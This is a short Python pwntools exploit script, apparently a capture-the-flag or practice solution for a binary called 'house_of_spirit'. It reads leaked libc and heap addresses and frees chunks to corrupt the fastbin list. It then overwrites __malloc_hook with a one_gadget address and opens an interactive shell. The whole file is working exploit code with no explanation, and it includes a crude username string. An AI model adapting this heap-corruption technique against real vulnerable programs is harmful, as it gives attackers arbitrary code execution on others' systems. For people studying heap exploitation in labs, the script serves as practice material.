#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./house_of_spirit")
libc = ELF("libc.so.6")
p = elf.process()
gdb.attach(p,"init-pwndbg")

def malloc(size,data,chunk_name):
    p.sendlineafter("> ","1")
    p.sendlineafter("size: ",str(size))
    p.sendafter("data: ",data)
    p.sendafter("chunk name:",chunk_name)

def free(index):
    p.sendlineafter("> ","2")
    p.sendlineafter("index: ",str(index))

p.recvuntil(b'@ ')
x = p.recvline()[:-1]
x = int(x,16)
libc.address = x - libc.sym.puts

p.recvuntil(b'@ ')
x = p.recvline()[:-1]
x = int(x,16)
heap_address = x
log.critical(hex(libc.address))
log.critical(hex(heap_address))

p.sendlineafter("Enter your age: ",p64(0x68))
p.sendlineafter("Enter your username: ", b'fuckboi')

malloc(0x68,'a'*8,'0'*8)
malloc(0x68,'b'*8,'1'*8)
malloc(0x68,'c'*8,b'2'*8+p64(heap_address+0x10))
free(0)
free(1)
free(2)

one_gadget = libc.address + 0xe1fa1
malloc(0x68,p64(libc.sym.__malloc_hook - 35),b'a'*8)
malloc(0x68,b'a'*8,b'a'*8)
malloc(0x68,b'a'*8,b'a'*8)
malloc(0x68,b'x'*19+p64(one_gadget),b'a'*8)
malloc(0x68,b'a'*8,b'a'*8)
p.interactive()